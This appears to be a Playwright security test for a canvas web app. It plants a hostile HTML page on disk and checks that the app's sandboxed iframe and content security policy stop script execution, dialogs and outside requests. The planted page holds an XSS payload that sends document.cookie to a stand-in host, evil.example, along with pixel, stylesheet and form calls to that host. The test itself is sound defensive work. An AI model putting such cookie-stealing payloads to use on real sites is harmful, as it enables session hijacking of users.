const { chromium } = require('playwright');
const fs = require('fs');
const ids = require('/tmp/cvdemo/ids.json');
const B = 'http://127.0.0.1:8000';
(async () => {
  const cv = await (await fetch(`${B}/canvases/${ids.cid}`)).json();
  const b = cv.doc.boards.find(x => x.id === ids.b[0]);
  const file = `/tmp/cvdemo/uploads/canvases/${ids.cid}/boards/${b.id}/r${b.content.rev}/index.html`;
  // a hostile page written straight onto the disk, past the cleaning on the way in: the frame must still be locked
  console.log('writing', file, fs.existsSync(file));
  fs.writeFileSync(file, `<!doctype html><html><body><h1 id=h>HOSTILE</h1>
<script>window.__pwned = 1; alert('xss'); fetch('http://evil.example/steal?c='+document.cookie);</script>
<img src="http://evil.example/pixel.gif"><link rel=stylesheet href="http://evil.example/x.css">
<div style="background:url(http://evil.example/bg.png)">x</div>
<a href="http://evil.example/go" id=a>go</a><form action="http://evil.example/post"><button id=f>send</button></form>
<script>document.getElementById('h').textContent='SCRIPT RAN'</script></body></html>`);
  const br = await chromium.launch();
  const ctx = await br.newContext({ viewport: { width: 1200, height: 800 } });
  const outside = [];
  await ctx.route(/evil\.example/, (route) => { outside.push(route.request().url()); route.abort(); });
  const p = await ctx.newPage();
  let dialogs = 0; p.on('dialog', d => { dialogs++; d.dismiss(); });
  // 1) in the app: the large view draws the board in its frame
  await p.goto('http://127.0.0.1:5173/', { waitUntil: 'networkidle' });
  await p.getByText('Redesign the sign-in screens').first().click();
  await p.waitForTimeout(1000);
  await p.locator('[data-testid=canvas-embed-stage]').first().click();
  await p.waitForSelector('[data-testid=canvas-viewer-board] iframe');
  await p.waitForTimeout(1500);
  console.log('iframe src', await p.locator('[data-testid=canvas-viewer-board] iframe').first().getAttribute('src'), 'expected', `/canvases/${ids.cid}/boards/${b.id}/r/${b.content.rev}/index.html`);
  const fr = p.frameLocator('[data-testid=canvas-viewer-board] iframe').first();
  const heading = await fr.locator('#h').textContent();
  await p.screenshot({ path: '/tmp/cvdemo/sec1.png' });
  // 2) the board's address opened on its own (what a person gets by pasting the link)
  const own = await ctx.newPage();
  own.on('dialog', d => { dialogs++; d.dismiss(); });
  const url = `${B}/canvases/${ids.cid}/boards/${b.id}/r/${b.content.rev}/index.html`;
  const resp = await own.goto(url);
  await own.waitForTimeout(1200);
  const pwned = await own.evaluate(() => ({ pwned: window.__pwned === 1, text: document.getElementById('h')?.textContent }));
  console.log('response CSP:', resp.headers()['content-security-policy']);
  console.log('in the large view the heading stays:', heading);
  console.log('opened on its own, script ran?', pwned);
  console.log('dialogs:', dialogs, 'outside requests:', outside.length, outside.slice(0, 3));
  const okAll = heading === 'HOSTILE' && !pwned.pwned && pwned.text === 'HOSTILE' && dialogs === 0 && outside.length === 0;
  console.log(okAll ? 'SECURITY CHECK PASSED' : 'SECURITY CHECK FAILED');
  await br.close();
})();
